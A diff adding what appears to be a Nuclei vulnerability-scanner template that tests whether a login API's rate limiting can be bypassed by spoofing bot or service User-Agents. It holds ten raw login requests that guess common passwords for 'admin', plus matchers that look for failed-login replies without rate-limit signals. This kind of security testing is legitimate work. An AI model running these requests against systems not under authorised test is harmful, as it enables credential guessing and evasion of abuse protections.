@@ -1,0 +1,151 @@
+id: medium-api-rate-limit-bypass-user-agent
+
+info:
+  name: Rate Limit Bypass via User-Agent
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects rate limiting bypass vulnerabilities where rate limits can be
+    circumvented by manipulating User-Agent headers, using bot/crawler agents,
+    or spoofing legitimate service identifiers to bypass rate limiting controls.
+  reference:
+    - https://owasp.org/www-community/attacks/Testing_for_Weak_lock_out_mechanism
+    - https://portswigger.net/web-security/authentication/password-based
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
+    cvss-score: 6.3
+    cwe-id: CWE-307
+  tags: api,rate-limiting,bypass,user-agent,brute-force,medium
+
+http:
+  - raw:
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
+
+        {"username":"admin","password":"password123"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
+
+        {"username":"admin","password":"admin123"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
+
+        {"username":"admin","password":"test123"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Twitterbot/1.0
+
+        {"username":"admin","password":"password"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com/)
+
+        {"username":"admin","password":"123456"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: WhatsApp/2.19.81 A
+
+        {"username":"admin","password":"qwerty"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)
+
+        {"username":"admin","password":"letmein"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: curl/7.68.0
+
+        {"username":"admin","password":"welcome"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: PostmanRuntime/7.28.4
+
+        {"username":"admin","password":"admin"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Internal-Service/1.0
+
+        {"username":"admin","password":"root"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 401
+          - 422
+          - 429
+
+      - type: regex
+        part: body
+        regex:
+          - '"error":\s*"invalid.*credentials"'
+          - '"error":\s*"authentication.*failed"'
+          - '"message":\s*"login.*failed"'
+          - '"success":\s*false'
+        condition: or
+
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - '"error":\s*"rate.*limit.*exceeded"'
+          - '"error":\s*"too.*many.*requests"'
+          - 'rate.*limit.*reached'
+          - 'request.*blocked'
+          - 'bot.*detected'
+
+      - type: word
+        part: header
+        negative: true
+        words:
+          - "X-RateLimit-Remaining: 0"
+          - "Retry-After:"
+          - "X-Bot-Protection: enabled"
+
+      - type: dsl
+        dsl:
+          - 'status_code != 429'
+
+      - type: word
+        part: response
+        negative: true
+        words:
+          - "bot protection activated"
+          - "user agent blocked"
+          - "crawler rate limited"
+
+    stop-at-first-match: true
